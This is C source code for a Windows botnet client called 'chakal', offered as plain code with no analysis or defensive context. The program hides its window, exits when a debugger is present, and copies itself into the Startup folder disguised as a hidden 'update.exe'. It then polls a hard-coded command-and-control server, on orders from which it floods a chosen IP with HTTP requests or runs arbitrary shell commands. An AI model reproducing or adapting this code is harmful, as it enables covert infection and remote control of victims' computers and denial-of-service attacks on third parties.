#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#define ip "35.202.69.129"  
#define file "gamefiles/f.php" 
#define botnet_name "chakal"
#define delay 1
#define key 2

char dosip[16];
int dostime;
char *req;
char *request;

DWORD WINAPI infect1(int argc, char **argv) {
	 char command[1024];
	 sprintf(command, "copy /Y \"%s\" \"%%userprofile%%\\documents\\update.exe\"", argv[0]);
	 system(command);
	 memset(command, 0, strlen(command));
	 sprintf(command, "copy /Y \"%s\" \"%%appdata%%\\microsoft\\windows\\start menu\\programs\\startup\\update.exe\"", argv[0]);
	 system(command);
	 memset(command, 0, strlen(command));
	 sprintf(command, "attrib +h +s \"%%appdata%%\\microsoft\\windows\\start menu\\programs\\startup\\update.exe\"");
	 system(command);
     memset(command, 0, strlen(command));
     sprintf(command , "attrib +h +s \"%%userprofile%%\\documents\\update.exe\"");
     system(command);
     memset(command, 0, strlen(command));
}

DWORD WINAPI dos() {
	 struct sockaddr_in sa;
  	 sa.sin_addr.s_addr = inet_addr(dosip);
	 sa.sin_port = htons(80);
	 sa.sin_family = AF_INET;
	 struct WSAData wsadata;
	 WSAStartup(MAKEWORD(2,2), &wsadata);
	 SOCKET fd = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
	 if(WSAConnect(fd, (struct sockaddr *)&sa, sizeof(sa), 0, 0 ,0,0) == 0) {
	 	send(fd, req, strlen(req), 0);
     }
     closesocket(fd);
}

int parse(char *outp) {
   int a;
   char *cmd;
   char *ddos;
   char timechar[4];
   int timeint;
   char cmdrel[10000];
   if(strstr(outp, "ddos:")) {
   	ddos = strstr(outp, "ddos:") + 5;
   	while(ddos[a] != ':') {
   	  dosip[a] = ddos[a];
	  a++;	
	}
	a++;
	int i = 0;
	while(ddos[a] != 0) {
		timechar[i] = ddos[a];
		a++;
		i++;
	}
	timeint = atoi(timechar);
	printf("ddosing %s for %d seconds", dosip, timeint);
	reqdos();
	int k, j;
	HANDLE thread[1000];
	for(k = 0; k < timeint; k++) {
	 for(j = 0; j < 1000; j++) {
	  thread[j] = CreateThread(0,0,&dos,0,0,0);		
	 }
	 for(j = 0; j < 1000; j++) {
	  WaitForSingleObject(thread[j], 0);		
	 }
	 sleep(1);
	}
	free(req);
   }
   if(strstr(outp, "cmd:")) {
   	cmd = strstr(outp, "cmd:") + 4;
   	sprintf(cmdrel, "cmd /c \"%s\"", cmd);
   	printf("%s", cmdrel); //debug
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	CreateProcess(0, cmdrel, 0, 0, TRUE, 0, 0, 0, &si, &pi);	
 } 
 memset(cmdrel, 0, strlen(cmdrel));
}

int receive() {
	 int i,k;
	 char outp[1000];	 
	 struct sockaddr_in sa;
	 sa.sin_addr.s_addr = inet_addr(ip);
	 sa.sin_port = htons(80);
	 sa.sin_family = AF_INET;
	 struct WSAData wsadata;
	 WSAStartup(MAKEWORD(2,2), &wsadata);
	 SOCKET fd = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
	 if(WSAConnect(fd, (struct sockaddr *)&sa, sizeof(sa), 0, 0 ,0,0) == 0) {
         send(fd, request, strlen(request), 0);
         recv(fd, outp, 1000,0);
         printf("%s", outp);
         parse(outp);
         memset(outp, 0, 1000);
       }
     closesocket(fd);
}

int req1() {
	request = malloc(2000);
	sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", file,ip,botnet_name);
}

int reqdos() {
	req = malloc(2000);
	sprintf(req, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", dosip, botnet_name);
}

int main(int argc, char *argv[]) {
    FreeConsole();
    sleep(delay);
    if(IsDebuggerPresent()) {
		return 0;
	}
    infect1(argc,argv);
	req1();
	while(1) {
	 receive();	
	 sleep(delay);
    }
}

